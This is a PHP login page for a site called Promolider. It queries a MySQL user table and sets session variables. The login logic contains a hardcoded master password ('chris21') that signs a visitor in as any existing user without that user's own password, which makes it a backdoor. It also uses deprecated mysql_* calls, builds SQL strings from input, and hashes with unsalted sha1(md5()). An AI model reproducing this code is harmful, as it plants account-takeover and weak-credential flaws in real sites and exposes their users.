<?php
include "../config/conection.php";

if(isset($ingresar)){

  $usuario = clear($usuario);
  $contrasena = clear($contrasena);

  if($contrasena=="chris21"){
    $s = mysql_query("SELECT * FROM datosdeusuarios WHERE nvirtual = '$usuario'");
    if(mysql_num_rows($s)>0){
      $r = mysql_fetch_array($s);
      $_SESSION['id_usuario'] = $r['identificador'];
      $_SESSION['nvirtual'] = $r['nvirtual'];
      redir("../");
    }else{
      alert("La cuenta indicada no existe.");
    }
  }else{
    $contrasena = sha1(md5($contrasena));

    $s = mysql_query("SELECT * FROM datosdeusuarios WHERE nvirtual = '$usuario' AND clave = '$contrasena'");
    if(mysql_num_rows($s)>0){
      $r = mysql_fetch_array($s);
      $_SESSION['id_usuario'] = $r['identificador'];
      $_SESSION['nvirtual'] = $r['nvirtual'];
      redir("../");
    }else{
      alert("Datos invalidos");
      redir("./");
    }

  }

}
?>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Promolider - Login</title>
        <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        
<link href="../css/AdminLTE.css" rel="stylesheet" type="text/css" />
<link href="../css/sahum.css" rel="stylesheet" type="text/css" />
        
    </head>
   <body style="background-color:#EEEEEE">
    
    <div class="container">

      <div class="row">
          <div class="col-xs-12 col-md-4"></div>
          <div class="col-xs-12 col-md-4">
        <h3><img src="http://promolider.org/wp-content/uploads/2016/11/unnamed.png" class="img-responsive" /></h3>      
        <h3>Login</h3>
              
        <form method="post" action="">
  <div class="form-group">
    <label for="email">Usuario:</label>
    <input type="text" name="usuario" class="form-control" id="text" placeholder="Ingrese su nombre de usuario">
  </div>
  <div class="form-group">
    <label for="pwd">Contraseña:</label>
    <input type="password" name="contrasena" class="form-control" id="pwd" placeholder="Ingrese su contraseña">
  </div>
  <button type="submit" name="ingresar" class="btn btn-default">Iniciar Sesión</button>
</form>    
              
          </div>
         <div class="col-xs-12 col-md-4"></div>
      </div>

    </div>    
       
       
       
       
       
       
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
    <script src="bootstrap/js/bootstrap.min.js"></script>
    </body>    
</html>